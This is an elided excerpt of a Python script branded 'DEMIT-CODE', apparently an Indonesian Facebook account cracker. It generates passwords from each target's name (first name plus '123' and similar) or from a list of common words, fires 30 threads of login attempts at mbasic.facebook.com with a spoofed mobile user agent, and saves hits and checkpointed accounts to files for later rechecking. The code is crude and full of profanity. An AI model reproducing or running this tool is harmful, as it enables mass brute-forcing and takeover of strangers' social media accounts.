...
/ /___   \033[1;91m/__  __/\033[1;37m  / /__   / ,< Au \033[1;36m• \033[1;32mDEMIT-CODE.\033[1;37m
...
def dekura_x():
	...
	demitelitindonesia = raw_input("%s [%s•%s] Choose: "%(p,b,p))
	if demiteliteindonesia in [""]:
		exit("\n%s [%s!%s] Pilihan tidak boleh kosong!"%(p,m,p))
	elif demitelitindonesia in ["1","01"]:
		...
		if bukanmaen in ["m","M"]:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				for user in id:
					...
					frist=name.split(" ")
					if len(frist)>=6:
						demit = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					elif len(frist)<=2:
						demit = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					elif len(frist)<=3:
						demit = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					else:
						demit = [ "sayang", "bissmilah", "anjing", "bangsat", "freefire", "katasandi", "indonesia", "sayangkamu" ]
					coeg.submit(api, uid, dekura)
			hasil()

	elif demiteliteindonesia == "2":
		bukanmaen = raw_input("%s [%s•%s] Crack With Pass Default/Manual [d/m]\n %s[%s•%s] Choose: "%(p,b,p,p,b,p))
		if bukanmaen in ["m","M"]:
			with ThreadPoolExecutor(max_workers=30) as coeg:
				asu = raw_input("%s [%s•%s] Example password: sayang, ganteng, cantik\n %s[%s•%s] Pass list: "%(p,b,p,p,b,p)).split(",")
...
def hasil():
	if len(ok) != 0 or len(cp) != 0:
		exit(demixcode.awokawokaowkwoawkwowksheheheiwoansvdemit_elite_indonesia())
	else:
		exit("\n%s [%s•%s] Lah? Kok Gak Dapat Hasil :v\n%s [%s!%s] Makanya Gans Biar Dapat Result :v"%(p,b,p,p,m,p))

def awokawokaowkwoawkwowksheheheiwoansvdemit_elite_indonesia():
    global token
...
def option_sesi():
	...
	for memek in buka_baju:
		...
		try:
			demit_elite (titid[0].replace(" + ",""), titid[1])
		except requests.exceptions.ConnectionError:
			pass
	os.remove('checkcp.txt')
	exit("\n%s [%s!%s] Done Ya Anjing"%(p,m,p))

def demit_elite(user, pasw):
...
def cek_opsi_sesi():
	...
	for memek in buka_baju:
		...
		print("\n\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Account : "+(kontol.replace(" + ","")))
		try:
			demitcheck(titid[0].replace(" + ",""), titid[1])
		except requests.exceptions.ConnectionError:
			pass
	os.remove('cp.txt')
	exit("\n%s [%s!%s] Done Ya Anjing"%(p,m,p))

def demitcheck(user, pasw):
	mb = ("https://mbasic.facebook.com")
	ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
	ses = requests.Session()
	# kntl bapackkau pecah
